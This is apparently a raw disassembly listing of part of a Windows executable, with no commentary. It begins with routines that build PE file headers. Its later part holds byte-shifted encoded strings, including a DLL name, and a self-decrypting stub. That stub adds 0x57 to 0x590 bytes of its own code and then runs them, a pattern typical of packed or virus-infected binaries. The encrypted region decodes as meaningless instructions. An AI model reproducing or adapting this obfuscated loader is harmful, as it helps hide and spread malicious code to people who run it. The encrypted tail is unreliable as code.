  402530:	68 30 90 40 00       	push   $0x409030
  402535:	e8 32 fb 00 00       	call   0x41206c
  40253a:	8b 46 04             	mov    0x4(%esi),%eax
  40253d:	8b 36                	mov    (%esi),%esi
  40253f:	31 d2                	xor    %edx,%edx
  402541:	b9 80 96 98 00       	mov    $0x989680,%ecx
  402546:	f7 f1                	div    %ecx
  402548:	96                   	xchg   %eax,%esi
  402549:	f7 f1                	div    %ecx
  40254b:	89 d3                	mov    %edx,%ebx
  40254d:	89 f2                	mov    %esi,%edx
  40254f:	2d 00 91 10 b6       	sub    $0xb6109100,%eax
  402554:	83 da 02             	sbb    $0x2,%edx
  402557:	a3 40 90 40 00       	mov    %eax,0x409040
  40255c:	8b 3d 08 90 40 00    	mov    0x409008,%edi
  402562:	66 b8 4c 01          	mov    $0x14c,%ax
  402566:	f6 05 7f 90 40 00 01 	testb  $0x1,0x40907f
  40256d:	74 04                	je     0x402573
  40256f:	66 b8 64 86          	mov    $0x8664,%ax
  402573:	66 ab                	stos   %ax,%es:(%edi)
  402575:	b8 01 00 00 00       	mov    $0x1,%eax
  40257a:	66 ab                	stos   %ax,%es:(%edi)
  40257c:	a1 40 90 40 00       	mov    0x409040,%eax
  402581:	ab                   	stos   %eax,%es:(%edi)
  402582:	83 c7 04             	add    $0x4,%edi
  402585:	b8 01 00 00 00       	mov    $0x1,%eax
  40258a:	f6 05 7f 90 40 00 01 	testb  $0x1,0x40907f
  402591:	74 06                	je     0x402599
  402593:	a1 2c 90 40 00       	mov    0x40902c,%eax
  402598:	40                   	inc    %eax
  402599:	ab                   	stos   %eax,%es:(%edi)
  40259a:	31 c0                	xor    %eax,%eax
  40259c:	66 ab                	stos   %ax,%es:(%edi)
  40259e:	66 b8 00 01          	mov    $0x100,%ax
  4025a2:	66 ab                	stos   %ax,%es:(%edi)
  4025a4:	be 68 90 40 00       	mov    $0x409068,%esi
  4025a9:	b9 02 00 00 00       	mov    $0x2,%ecx
  4025ae:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4025b0:	31 c0                	xor    %eax,%eax
  4025b2:	ab                   	stos   %eax,%es:(%edi)
  4025b3:	ab                   	stos   %eax,%es:(%edi)
  4025b4:	83 c7 04             	add    $0x4,%edi
  4025b7:	b8 3c 00 00 00       	mov    $0x3c,%eax
  4025bc:	ab                   	stos   %eax,%es:(%edi)
  4025bd:	83 c7 04             	add    $0x4,%edi
  4025c0:	31 c0                	xor    %eax,%eax
  4025c2:	ab                   	stos   %eax,%es:(%edi)
  4025c3:	a1 2c 90 40 00       	mov    0x40902c,%eax
  4025c8:	66 ab                	stos   %ax,%es:(%edi)
  4025ca:	31 c0                	xor    %eax,%eax
  4025cc:	66 ab                	stos   %ax,%es:(%edi)
  4025ce:	b8 40 00 00 40       	mov    $0x40000040,%eax
  4025d3:	ab                   	stos   %eax,%es:(%edi)
  4025d4:	89 3d 0c 90 40 00    	mov    %edi,0x40900c
  4025da:	89 3d 1c 90 40 00    	mov    %edi,0x40901c
  4025e0:	c7 05 20 90 40 00 00 	movl   $0x0,0x409020
  4025e7:	00 00 00 
  4025ea:	e8 53 fd ff ff       	call   0x402342
  4025ef:	e8 97 fb ff ff       	call   0x40218b
  4025f4:	74 07                	je     0x4025fd
  4025f6:	e8 d2 fc ff ff       	call   0x4022cd
  4025fb:	eb f2                	jmp    0x4025ef
  4025fd:	e8 16 f8 ff ff       	call   0x401e18
  402602:	66 89 47 0c          	mov    %ax,0xc(%edi)
  402606:	e8 9d fb ff ff       	call   0x4021a8
  40260b:	74 07                	je     0x402614
  40260d:	e8 a3 fc ff ff       	call   0x4022b5
  402612:	eb f2                	jmp    0x402606
  402614:	e8 ff f7 ff ff       	call   0x401e18
  402619:	66 89 47 0e          	mov    %ax,0xe(%edi)
  40261d:	ff 35 0c 90 40 00    	push   0x40900c
  402623:	ff 05 20 90 40 00    	incl   0x409020
  402629:	8b 35 1c 90 40 00    	mov    0x40901c,%esi
  40262f:	31 c9                	xor    %ecx,%ecx
  402631:	66 8b 4e 0c          	mov    0xc(%esi),%cx
  402635:	83 c6 10             	add    $0x10,%esi
  402638:	e3 3e                	jecxz  0x402678
  40263a:	e8 03 fd ff ff       	call   0x402342
  40263f:	e8 ea fc ff ff       	call   0x40232e
  402644:	e8 23 fc ff ff       	call   0x40226c
  402649:	74 07                	je     0x402652
  40264b:	e8 7d fc ff ff       	call   0x4022cd
  402650:	eb f2                	jmp    0x402644
  402652:	e8 c1 f7 ff ff       	call   0x401e18
  402657:	66 89 47 0c          	mov    %ax,0xc(%edi)
  40265b:	e8 c3 fb ff ff       	call   0x402223
  402660:	74 07                	je     0x402669
  402662:	e8 4e fc ff ff       	call   0x4022b5
  402667:	eb f2                	jmp    0x40265b
  402669:	e8 aa f7 ff ff       	call   0x401e18
  40266e:	66 89 47 0e          	mov    %ax,0xe(%edi)
  402672:	83 c6 08             	add    $0x8,%esi
  402675:	49                   	dec    %ecx
  402676:	75 c2                	jne    0x40263a
  402678:	31 c9                	xor    %ecx,%ecx
  40267a:	a1 1c 90 40 00       	mov    0x40901c,%eax
  40267f:	66 8b 48 0e          	mov    0xe(%eax),%cx
  402683:	e3 3e                	jecxz  0x4026c3
  402685:	e8 b8 fc ff ff       	call   0x402342
  40268a:	e8 9f fc ff ff       	call   0x40232e
  40268f:	e8 fe fb ff ff       	call   0x402292
  402694:	74 07                	je     0x40269d
  402696:	e8 32 fc ff ff       	call   0x4022cd
  40269b:	eb f2                	jmp    0x40268f
  40269d:	e8 76 f7 ff ff       	call   0x401e18
  4026a2:	66 89 47 0c          	mov    %ax,0xc(%edi)
  4026a6:	e8 9e fb ff ff       	call   0x402249
  4026ab:	74 07                	je     0x4026b4
  4026ad:	e8 03 fc ff ff       	call   0x4022b5
  4026b2:	eb f2                	jmp    0x4026a6
  4026b4:	e8 5f f7 ff ff       	call   0x401e18
  4026b9:	66 89 47 0e          	mov    %ax,0xe(%edi)
  4026bd:	83 c6 08             	add    $0x8,%esi
  4026c0:	49                   	dec    %ecx
  4026c1:	75 c2                	jne    0x402685
  4026c3:	5e                   	pop    %esi
  4026c4:	a1 14 90 40 00       	mov    0x409014,%eax
  4026c9:	01 05 18 90 40 00    	add    %eax,0x409018
  4026cf:	50                   	push   %eax
  4026d0:	ff 35 18 90 40 00    	push   0x409018
  4026d6:	ff 05 20 90 40 00    	incl   0x409020
  4026dc:	8b 15 1c 90 40 00    	mov    0x40901c,%edx
  4026e2:	31 c9                	xor    %ecx,%ecx
  4026e4:	66 8b 4a 0c          	mov    0xc(%edx),%cx
  4026e8:	66 03 4a 0e          	add    0xe(%edx),%cx
  4026ec:	e3 4e                	jecxz  0x40273c
  4026ee:	51                   	push   %ecx
  4026ef:	31 c9                	xor    %ecx,%ecx
  4026f1:	66 8b 4e 0c          	mov    0xc(%esi),%cx
  4026f5:	66 03 4e 0e          	add    0xe(%esi),%cx
  4026f9:	e3 3d                	jecxz  0x402738
  4026fb:	83 c6 10             	add    $0x10,%esi
  4026fe:	8b 56 04             	mov    0x4(%esi),%edx
  402701:	e8 3c fc ff ff       	call   0x402342
  402706:	e8 23 fc ff ff       	call   0x40232e
  40270b:	e8 25 fa ff ff       	call   0x402135
  402710:	0f 82 2a 01 00 00    	jb     0x402840
  402716:	74 11                	je     0x402729
  402718:	52                   	push   %edx
  402719:	e8 97 fb ff ff       	call   0x4022b5
  40271e:	e8 40 fc ff ff       	call   0x402363
  402723:	89 53 04             	mov    %edx,0x4(%ebx)
  402726:	5a                   	pop    %edx
  402727:	eb e2                	jmp    0x40270b
  402729:	e8 ea f6 ff ff       	call   0x401e18
  40272e:	66 89 47 0e          	mov    %ax,0xe(%edi)
  402732:	83 c6 08             	add    $0x8,%esi
  402735:	49                   	dec    %ecx
  402736:	75 c6                	jne    0x4026fe
  402738:	59                   	pop    %ecx
  402739:	49                   	dec    %ecx
  40273a:	75 b2                	jne    0x4026ee
  40273c:	8b 35 1c 90 40 00    	mov    0x40901c,%esi
  402742:	a1 0c 90 40 00       	mov    0x40900c,%eax
  402747:	29 f0                	sub    %esi,%eax
  402749:	3b 35 0c 90 40 00    	cmp    0x40900c,%esi
  40274f:	73 3f                	jae    0x402790
  402751:	89 f2                	mov    %esi,%edx
  402753:	31 c9                	xor    %ecx,%ecx
  402755:	66 8b 4a 0c          	mov    0xc(%edx),%cx
  402759:	83 c6 10             	add    $0x10,%esi
  40275c:	e3 19                	jecxz  0x402777
  40275e:	01 06                	add    %eax,(%esi)
  402760:	81 0e 00 00 00 80    	orl    $0x80000000,(%esi)
  402766:	f7 46 04 00 00 00 80 	testl  $0x80000000,0x4(%esi)
  40276d:	75 03                	jne    0x402772
  40276f:	01 46 04             	add    %eax,0x4(%esi)
  402772:	83 c6 08             	add    $0x8,%esi
  402775:	e2 e7                	loop   0x40275e
  402777:	66 8b 4a 0e          	mov    0xe(%edx),%cx
  40277b:	e3 cc                	jecxz  0x402749
  40277d:	f7 46 04 00 00 00 80 	testl  $0x80000000,0x4(%esi)
  402784:	75 03                	jne    0x402789
  402786:	01 46 04             	add    %eax,0x4(%esi)
  402789:	83 c6 08             	add    $0x8,%esi
  40278c:	e2 ef                	loop   0x40277d
  40278e:	eb b9                	jmp    0x402749
  402790:	59                   	pop    %ecx
  402791:	5e                   	pop    %esi
  402792:	56                   	push   %esi
  402793:	8b 3d 18 90 40 00    	mov    0x409018,%edi
  402799:	89 fa                	mov    %edi,%edx
  40279b:	89 c5                	mov    %eax,%ebp
  40279d:	2b 2d 10 90 40 00    	sub    0x409010,%ebp
  4027a3:	29 f1                	sub    %esi,%ecx
  4027a5:	72 1a                	jb     0x4027c1
  4027a7:	c1 e9 04             	shr    $0x4,%ecx
  4027aa:	74 15                	je     0x4027c1
  4027ac:	f6 05 7f 90 40 00 01 	testb  $0x1,0x40907f
  4027b3:	74 07                	je     0x4027bc
  4027b5:	e8 1c fc ff ff       	call   0x4023d6
  4027ba:	eb 05                	jmp    0x4027c1
  4027bc:	e8 f7 fb ff ff       	call   0x4023b8
  4027c1:	89 3d 18 90 40 00    	mov    %edi,0x409018
  4027c7:	8b 35 08 90 40 00    	mov    0x409008,%esi
  4027cd:	01 ea                	add    %ebp,%edx
  4027cf:	89 56 24             	mov    %edx,0x24(%esi)
  4027d2:	83 c2 3c             	add    $0x3c,%edx
  4027d5:	89 56 2c             	mov    %edx,0x2c(%esi)
  4027d8:	8b 3d 18 90 40 00    	mov    0x409018,%edi
  4027de:	83 c5 3c             	add    $0x3c,%ebp
  4027e1:	89 fa                	mov    %edi,%edx
  4027e3:	01 ea                	add    %ebp,%edx
  4027e5:	89 56 08             	mov    %edx,0x8(%esi)
  4027e8:	be 68 90 40 00       	mov    $0x409068,%esi
  4027ed:	b9 02 00 00 00       	mov    $0x2,%ecx
  4027f2:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4027f4:	31 c0                	xor    %eax,%eax
  4027f6:	ab                   	stos   %eax,%es:(%edi)
  4027f7:	40                   	inc    %eax
  4027f8:	66 ab                	stos   %ax,%es:(%edi)
  4027fa:	31 c0                	xor    %eax,%eax
  4027fc:	66 ab                	stos   %ax,%es:(%edi)
  4027fe:	b8 03 00 00 00       	mov    $0x3,%eax
  402803:	aa                   	stos   %al,%es:(%edi)
  402804:	31 c0                	xor    %eax,%eax
  402806:	aa                   	stos   %al,%es:(%edi)
  402807:	5e                   	pop    %esi
  402808:	f6 05 7f 90 40 00 01 	testb  $0x1,0x40907f
  40280f:	74 07                	je     0x402818
  402811:	e8 df fb ff ff       	call   0x4023f5
  402816:	eb 15                	jmp    0x40282d
  402818:	ab                   	stos   %eax,%es:(%edi)
  402819:	89 3d 18 90 40 00    	mov    %edi,0x409018
  40281f:	8b 3d 1c 90 40 00    	mov    0x40901c,%edi
  402825:	b8 49 41 30 34       	mov    $0x34304149,%eax
  40282a:	89 47 08             	mov    %eax,0x8(%edi)
  40282d:	e8 e9 ed ff ff       	call   0x40161b
  402832:	73 1e                	jae    0x402852
  402834:	ba 9e 94 40 00       	mov    $0x40949e,%edx
  402839:	e8 01 e9 ff ff       	call   0x40113f
  40283e:	eb 12                	jmp    0x402852
  402840:	59                   	pop    %ecx
  402841:	59                   	pop    %ecx
  402842:	59                   	pop    %ecx
  402843:	e8 71 f8 ff ff       	call   0x4020b9
  402848:	ba c0 f2 40 00       	mov    $0x40f2c0,%edx
  40284d:	e8 ed e8 ff ff       	call   0x40113f
  402852:	68 00 80 00 00       	push   $0x8000
  402857:	6a 00                	push   $0x0
  402859:	ff 35 08 90 40 00    	push   0x409008
  40285f:	e8 0e f8 00 00       	call   0x412072
  402864:	68 00 80 00 00       	push   $0x8000
  402869:	6a 00                	push   $0x0
  40286b:	ff 35 10 90 40 00    	push   0x409010
  402871:	e8 fc f7 00 00       	call   0x412072
  402876:	5d                   	pop    %ebp
  402877:	c3                   	ret
  402878:	a1 e0 a9 40 00       	mov    0x40a9e0,%eax
  40287d:	c7 00 2e 52 43 20    	movl   $0x2043522e,(%eax)
  402883:	c6 40 03 00          	movb   $0x0,0x3(%eax)
  402887:	c3                   	ret
  402888:	a1 e0 a9 40 00       	mov    0x40a9e0,%eax
  40288d:	c7 00 2e 52 45 53    	movl   $0x5345522e,(%eax)
  402893:	c6 40 04 00          	movb   $0x0,0x4(%eax)
  402897:	c3                   	ret
  402898:	8b 54 24 04          	mov    0x4(%esp),%edx
  40289c:	8b 52 04             	mov    0x4(%edx),%edx
  40289f:	bf 20 a9 40 00       	mov    $0x40a920,%edi
  4028a4:	be 08 a8 40 00       	mov    $0x40a808,%esi
  4028a9:	83 c6 13             	add    $0x13,%esi
  4028ac:	8b 06                	mov    (%esi),%eax
  4028ae:	89 87 90 00 00 00    	mov    %eax,0x90(%edi)
  4028b4:	81 c7 99 00 00 00    	add    $0x99,%edi
  4028ba:	8b 82 b8 00 00 00    	mov    0xb8(%edx),%eax
  4028c0:	e8 3b e7 ff ff       	call   0x401000
  4028c5:	66 c7 07 68 22       	movw   $0x2268,(%edi)
  4028ca:	6a 00                	push   $0x0
  4028cc:	68 00 90 40 00       	push   $0x409000
  4028d1:	68 bd 00 00 00       	push   $0xbd
  4028d6:	68 20 a9 40 00       	push   $0x40a920
  4028db:	ff 35 64 90 40 00    	push   0x409064
  4028e1:	e8 ca e7 ff ff       	call   0x4010b0
  4028e6:	b8 01 00 00 00       	mov    $0x1,%eax
  4028eb:	c3                   	ret
  4028ec:	8b 0d 90 aa 40 00    	mov    0x40aa90,%ecx
  4028f2:	e3 10                	jecxz  0x402904
  4028f4:	51                   	push   %ecx
  4028f5:	e8 60 f7 00 00       	call   0x41205a
  4028fa:	c7 05 90 aa 40 00 00 	movl   $0x0,0x40aa90
  402901:	00 00 00 
  402904:	8b 0d 44 90 40 00    	mov    0x409044,%ecx
  40290a:	e3 10                	jecxz  0x40291c
  40290c:	51                   	push   %ecx
  40290d:	e8 12 f7 00 00       	call   0x412024
  402912:	c7 05 44 90 40 00 00 	movl   $0x0,0x409044
  402919:	00 00 00 
  40291c:	8b 0d 48 90 40 00    	mov    0x409048,%ecx
  402922:	e3 10                	jecxz  0x402934
  402924:	51                   	push   %ecx
  402925:	e8 fa f6 00 00       	call   0x412024
  40292a:	c7 05 48 90 40 00 00 	movl   $0x0,0x409048
  402931:	00 00 00 
  402934:	c3                   	ret
  402935:	f6 05 c4 ab 40 00 04 	testb  $0x4,0x40abc4
  40293c:	74 16                	je     0x402954
  40293e:	8b 0d 90 aa 40 00    	mov    0x40aa90,%ecx
  402944:	e8 f8 14 00 00       	call   0x403e41
  402949:	c7 05 90 aa 40 00 00 	movl   $0x0,0x40aa90
  402950:	00 00 00 
  402953:	c3                   	ret
  402954:	e8 93 ff ff ff       	call   0x4028ec
  402959:	c3                   	ret
  40295a:	c3                   	ret
  40295b:	be c0 f2 40 00       	mov    $0x40f2c0,%esi
  402960:	c7 06 94 00 00 00    	movl   $0x94,(%esi)
  402966:	56                   	push   %esi
  402967:	e8 0c f7 00 00       	call   0x412078
  40296c:	83 7e 10 01          	cmpl   $0x1,0x10(%esi)
  402970:	76 e8                	jbe    0x40295a
  402972:	68 e4 a9 40 00       	push   $0x40a9e4
  402977:	e8 02 f7 00 00       	call   0x41207e
  40297c:	89 c7                	mov    %eax,%edi
  40297e:	68 f1 a9 40 00       	push   $0x40a9f1
  402983:	57                   	push   %edi
  402984:	e8 fb f6 00 00       	call   0x412084
  402989:	09 c0                	or     %eax,%eax
  40298b:	74 7c                	je     0x402a09
  40298d:	a3 4c 90 40 00       	mov    %eax,0x40904c
  402992:	68 ff a9 40 00       	push   $0x40a9ff
  402997:	57                   	push   %edi
  402998:	e8 e7 f6 00 00       	call   0x412084
  40299d:	09 c0                	or     %eax,%eax
  40299f:	74 68                	je     0x402a09
  4029a1:	a3 50 90 40 00       	mov    %eax,0x409050
  4029a6:	68 0b aa 40 00       	push   $0x40aa0b
  4029ab:	57                   	push   %edi
  4029ac:	e8 d3 f6 00 00       	call   0x412084
  4029b1:	09 c0                	or     %eax,%eax
  4029b3:	74 54                	je     0x402a09
  4029b5:	a3 54 90 40 00       	mov    %eax,0x409054
  4029ba:	68 1e aa 40 00       	push   $0x40aa1e
  4029bf:	57                   	push   %edi
  4029c0:	e8 bf f6 00 00       	call   0x412084
  4029c5:	09 c0                	or     %eax,%eax
  4029c7:	74 40                	je     0x402a09
  4029c9:	a3 58 90 40 00       	mov    %eax,0x409058
  4029ce:	68 2a aa 40 00       	push   $0x40aa2a
  4029d3:	57                   	push   %edi
  4029d4:	e8 ab f6 00 00       	call   0x412084
  4029d9:	09 c0                	or     %eax,%eax
  4029db:	74 2c                	je     0x402a09
  4029dd:	a3 5c 90 40 00       	mov    %eax,0x40905c
  4029e2:	68 39 aa 40 00       	push   $0x40aa39
  4029e7:	e8 9e f6 00 00       	call   0x41208a
  4029ec:	89 c7                	mov    %eax,%edi
  4029ee:	68 44 aa 40 00       	push   $0x40aa44
  4029f3:	57                   	push   %edi
  4029f4:	e8 8b f6 00 00       	call   0x412084
  4029f9:	09 c0                	or     %eax,%eax
  4029fb:	74 0c                	je     0x402a09
  4029fd:	a3 60 90 40 00       	mov    %eax,0x409060
  402a02:	80 0d c4 ab 40 00 80 	orb    $0x80,0x40abc4
  402a09:	c3                   	ret
  402a0a:	bb 44 78 65 49       	mov    $0x49657844,%ebx
  402a0f:	93                   	xchg   %eax,%ebx
  402a10:	e9 20 01 00 00       	jmp    0x402b35
  402a15:	df 85 e8 e4 90 14    	filds  0x1490e4e8(%ebp)
  402a1b:	e8 e4 68 3e 68       	call   0x687e9304
  402a20:	68 68 e8 68 68       	push   $0x6868e868
  402a25:	ec                   	in     (%dx),%al
  402a26:	68 68 68 c7 99       	push   $0x99c76868
  402a2b:	9e                   	sahf
  402a2c:	99                   	cltd
  402a2d:	98                   	cwtl
  402a2e:	99                   	cltd
  402a2f:	a1 9f 9e 68 68       	mov    0x68689e9f,%eax
  402a34:	68 dc c9 e2 cd       	push   $0xcde2c9dc
  402a39:	ca c9 d5             	lret   $0xd5c9
  402a3c:	c9                   	leave
  402a3d:	96                   	xchg   %eax,%esi
  402a3e:	cc                   	int3
  402a3f:	d4 d4                	aam    $0xd4
  402a41:	68 68 68 68 c4       	push   $0xc4686868
  402a46:	68 68 68 ae da       	push   $0xdaae6868
  402a4b:	cd cd                	int    $0xcd
  402a4d:	b4 d1                	mov    $0xd1,%ah
  402a4f:	ca da c9             	lret   $0xc9da
  402a52:	da e1                	(bad)
  402a54:	68 ab da cd c9       	push   $0xc9cddaab
  402a59:	dc cd                	fmul   %st,%st(5)
  402a5b:	ac                   	lods   %ds:(%esi),%al
  402a5c:	d1 da                	rcr    $1,%edx
  402a5e:	cd cb                	int    $0xcb
  402a60:	dc d7                	(bad)
  402a62:	da e1                	(bad)
  402a64:	a9 68 68 68 68       	test   $0x68686868,%eax
  402a69:	af                   	scas   %es:(%edi),%eax
  402a6a:	cd dc                	int    $0xdc
  402a6c:	bf d1 d6 cc d7       	mov    $0xd7ccd6d1,%edi
  402a71:	df db                	(bad)
  402a73:	ac                   	lods   %ds:(%esi),%al
  402a74:	d1 da                	rcr    $1,%edx
  402a76:	cd cb                	int    $0xcb
  402a78:	dc d7                	(bad)
  402a7a:	da e1                	(bad)
  402a7c:	a9 68 68 68 68       	test   $0x68686868,%eax
  402a81:	af                   	scas   %es:(%edi),%eax
  402a82:	cd dc                	int    $0xdc
  402a84:	b5 d7                	mov    $0xd7,%ch
  402a86:	cc                   	int3
  402a87:	dd d4                	fst    %st(4)
  402a89:	cd ae                	int    $0xae
  402a8b:	d1 d4                	rcl    $1,%esp
  402a8d:	cd b6                	int    $0xb6
  402a8f:	c9                   	leave
  402a90:	d5 cd                	aad    $0xcd
  402a92:	a9 68 68 af cd       	test   $0xcdaf6868,%eax
  402a97:	dc b8 da d7 cb cd    	fdivrl -0x32342826(%eax)
  402a9d:	db db                	fcmovnu %st(3),%st
  402a9f:	b0 cd                	mov    $0xcd,%al
  402aa1:	c9                   	leave
  402aa2:	d8 68 68             	fsubrs 0x68(%eax)
  402aa5:	b0 cd                	mov    $0xcd,%al
  402aa7:	c9                   	leave
  402aa8:	d8 ae da cd cd 68    	fsubrs 0x68cdcdda(%esi)
  402aae:	68 68 68 b0 cd       	push   $0xcdb06868
  402ab3:	c9                   	leave
  402ab4:	d8 a9 d4 d4 d7 cb    	fsubrs -0x34282b2c(%ecx)
  402aba:	68 68 68 ba cd       	push   $0xcdba6868
  402abf:	c9                   	leave
  402ac0:	cc                   	int3
  402ac1:	ae                   	scas   %es:(%edi),%al
  402ac2:	d1 d4                	rcl    $1,%esp
  402ac4:	cd 68                	int    $0x68
  402ac6:	68 68 68 bb cd       	push   $0xcdbb6868
  402acb:	dc ae d1 d4 cd b8    	fsubrl -0x47322b2f(%esi)
  402ad1:	d7                   	xlat   %ds:(%ebx)
  402ad2:	d1 d6                	rcl    $1,%esi
  402ad4:	dc cd                	fmul   %st,%st(5)
  402ad6:	da 68 68             	fisubrl 0x68(%eax)
  402ad9:	ab                   	stos   %eax,%es:(%edi)
  402ada:	d4 d7                	aam    $0xd7
  402adc:	db cd                	fcmovne %st(5),%st
  402ade:	b0 c9                	mov    $0xc9,%al
  402ae0:	d6                   	salc
  402ae1:	cc                   	int3
  402ae2:	d4 cd                	aam    $0xcd
  402ae4:	68 bf da d1 dc       	push   $0xdcd1dabf
  402ae9:	cd ae                	int    $0xae
  402aeb:	d1 d4                	rcl    $1,%esp
  402aed:	cd 68                	int    $0x68
  402aef:	68 68 d3 cd da       	push   $0xdacdd368
  402af4:	d6                   	salc
  402af5:	cd d4                	int    $0xd4
  402af7:	9b                   	fwait
  402af8:	9a 96 cc d4 d4 68 68 	lcall  $0x6868,$0xd4d4cc96
  402aff:	68 68 b7 d8 cd       	push   $0xcdd8b768
  402b04:	d6                   	salc
  402b05:	ae                   	scas   %es:(%edi),%al
  402b06:	d1 d4                	rcl    $1,%esp
  402b08:	cd 68                	int    $0x68
  402b0a:	68 68 68 ab a2       	push   $0xa2ab6868
  402b0f:	c4 ac d7 cb dd d5 cd 	les    -0x322a2235(%edi,%edx,8),%ebp
  402b16:	d6                   	salc
  402b17:	dc db                	(bad)
  402b19:	88 c9                	mov    %cl,%cl
  402b1b:	d6                   	salc
  402b1c:	cc                   	int3
  402b1d:	88 bb cd dc dc d1    	mov    %bh,-0x2e232333(%ebx)
  402b23:	d6                   	salc
  402b24:	cf                   	iret
  402b25:	db 68 68             	fldt   0x68(%eax)
  402b28:	68 68 68 68 68       	push   $0x68686868
  402b2d:	68 68 68 68 68       	push   $0x68686868
  402b32:	68 68 00 55 8b       	push   $0x8b550068
  402b37:	ec                   	in     (%dx),%al
  402b38:	81 ec d8 06 00 00    	sub    $0x6d8,%esp
  402b3e:	53                   	push   %ebx
  402b3f:	56                   	push   %esi
  402b40:	57                   	push   %edi
  402b41:	b9 00 00 00 00       	mov    $0x0,%ecx
  402b46:	b8 60 2b 40 00       	mov    $0x402b60,%eax
  402b4b:	8a 38                	mov    (%eax),%bh
  402b4d:	80 c7 57             	add    $0x57,%bh
  402b50:	88 38                	mov    %bh,(%eax)
  402b52:	83 c0 01             	add    $0x1,%eax
  402b55:	83 c1 01             	add    $0x1,%ecx
  402b58:	81 f9 90 05 00 00    	cmp    $0x590,%ecx
  402b5e:	75 eb                	jne    0x402b4b
  402b60:	61                   	popa
  402b61:	be d3 e9 a9 62       	mov    $0x62a9e9d3,%esi
  402b66:	a9 a9 a9 a9 33       	test   $0x33a9a9a9,%eax
  402b6b:	c1 29 6c             	shrl   $0x6c,(%ecx)
  402b6e:	41                   	inc    %ecx
  402b6f:	31 c1                	xor    %eax,%ecx
  402b71:	2c 6a                	sub    $0x6a,%al
  402b73:	aa                   	stos   %al,%es:(%edi)
  402b74:	2c 69                	sub    $0x69,%al
  402b76:	aa                   	stos   %al,%es:(%edi)
  402b77:	2a a2 c8 aa a9 a9    	sub    -0x56565538(%edx),%ah
  402b7d:	25 94 62 af a9       	and    $0xa9af6294,%eax
  402b82:	a9 a9 67 b6 d4       	test   $0xd4b667a9,%eax
  402b87:	e9 a9 36 66 b9       	jmp    0xb9a66235
  402b8c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402b8d:	a8 a8                	test   $0xa8,%al
  402b8f:	dc 84 9c 4e 0f 4e 62 	faddl  0x624e0f4e(%esp,%ebx,4)
  402b96:	ed                   	in     (%dx),%eax
  402b97:	a9 a9 a9 dc 69       	test   $0x69dca9a9,%eax
  402b9c:	36 66 d3 a6 a8 a8 32 	shlw   %cl,%ss:0x632a8a8(%esi)
  402ba3:	06 
  402ba4:	a1 9c 54 0f 54       	mov    0x540f549c,%eax
  402ba9:	68 aa d4 e9 a9       	push   $0xa9e9d4aa
  402bae:	70 ee                	jo     0x402b9e
  402bb0:	99                   	cltd
  402bb1:	9a d3 e9 a9 32 26 9d 	lcall  $0x9d26,$0x32a9e9d3
  402bb8:	32 06                	xor    (%esi),%al
  402bba:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402bbb:	4a                   	dec    %edx
  402bbc:	5e                   	pop    %esi
  402bbd:	d9 e9                	fldl2t
  402bbf:	a9 2c a1 a9 1e       	test   $0x1ea9a12c,%eax
  402bc4:	b7 a8                	mov    $0xa8,%bh
  402bc6:	1e                   	push   %ds
  402bc7:	99                   	cltd
  402bc8:	a8 be                	test   $0xbe,%al
  402bca:	ed                   	in     (%dx),%eax
  402bcb:	ca ea a9             	lret   $0xa9ea
  402bce:	4c                   	dec    %esp
  402bcf:	5e                   	pop    %esi
  402bd0:	d9 e9                	fldl2t
  402bd2:	a9 a8 1e 9d f9       	test   $0xf99d1ea8,%eax
  402bd7:	a8 be                	test   $0xbe,%al
  402bd9:	e9 ca ea a9 32       	jmp    0x32ea16a8
  402bde:	ee                   	out    %al,(%dx)
  402bdf:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402be0:	34 ee                	xor    $0xee,%al
  402be2:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402be3:	67 8e d3             	addr16 mov %ebx,%ss
  402be6:	e9 a9 4c 62 d9       	jmp    0xd9a27894
  402beb:	e9 a9 32 1e 9d       	jmp    0x9d5e5e99
  402bf0:	32 06                	xor    (%esi),%al
  402bf2:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402bf3:	4a                   	dec    %edx
  402bf4:	5e                   	pop    %esi
  402bf5:	d9 e9                	fldl2t
  402bf7:	a9 2c a1 a9 1e       	test   $0x1ea9a12c,%eax
  402bfc:	b7 a8                	mov    $0xa8,%bh
  402bfe:	1e                   	push   %ds
  402bff:	99                   	cltd
  402c00:	a8 be                	test   $0xbe,%al
  402c02:	ed                   	in     (%dx),%eax
  402c03:	ca ea a9             	lret   $0xa9ea
  402c06:	4c                   	dec    %esp
  402c07:	5e                   	pop    %esi
  402c08:	d9 e9                	fldl2t
  402c0a:	a9 a8 1e 9d f9       	test   $0xf99d1ea8,%eax
  402c0f:	a8 be                	test   $0xbe,%al
  402c11:	e9 ca ea a9 32       	jmp    0x32ea16e0
  402c16:	ee                   	out    %al,(%dx)
  402c17:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402c18:	34 f6                	xor    $0xf6,%al
  402c1a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402c1b:	70 ee                	jo     0x402c0b
  402c1d:	9d                   	popf
  402c1e:	82 d3 e9             	adc    $0xe9,%bl
  402c21:	a9 32 b6 66 d9       	test   $0xd966b632,%eax
  402c26:	e9 a9 32 06 a5       	jmp    0xa5465ed4
  402c2b:	4a                   	dec    %edx
  402c2c:	5e                   	pop    %esi
  402c2d:	d9 e9                	fldl2t
  402c2f:	a9 2c a1 a9 1e       	test   $0x1ea9a12c,%eax
  402c34:	b7 a8                	mov    $0xa8,%bh
  402c36:	1e                   	push   %ds
  402c37:	99                   	cltd
  402c38:	a8 be                	test   $0xbe,%al
  402c3a:	ed                   	in     (%dx),%eax
  402c3b:	ca ea a9             	lret   $0xa9ea
  402c3e:	4c                   	dec    %esp
  402c3f:	5e                   	pop    %esi
  402c40:	d9 e9                	fldl2t
  402c42:	a9 a8 1e 9d f9       	test   $0xf99d1ea8,%eax
  402c47:	a8 be                	test   $0xbe,%al
  402c49:	e9 ca ea a9 32       	jmp    0x32ea1718
  402c4e:	ee                   	out    %al,(%dx)
  402c4f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402c50:	34 fe                	xor    $0xfe,%al
  402c52:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402c53:	32 26                	xor    (%esi),%ah
  402c55:	9d                   	popf
  402c56:	32 be 6a d9 e9 a9    	xor    -0x56162696(%esi),%bh
